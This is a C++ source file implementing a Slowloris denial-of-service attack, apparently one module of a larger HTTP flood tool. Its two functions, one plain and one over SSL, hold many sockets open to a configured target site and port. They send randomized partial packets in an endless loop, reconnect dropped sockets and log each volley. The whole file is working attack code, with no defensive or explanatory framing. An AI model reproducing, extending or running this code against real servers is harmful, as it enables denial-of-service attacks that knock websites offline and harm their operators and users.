#include <netdb.h>
#include <cstring>
#include <unistd.h>
#include <openssl/ssl.h>

#include "../Headers/Slowloris.hpp"

void Slowloris::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        keep_alive.push_back(false);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                keep_alive[x] = false;
            }
            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

void Slowloris::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
        keep_alive.push_back(false);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }
            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

Slowloris::Slowloris(const config *conf, Logger *logger) : Http_Flood(conf, logger) {

}

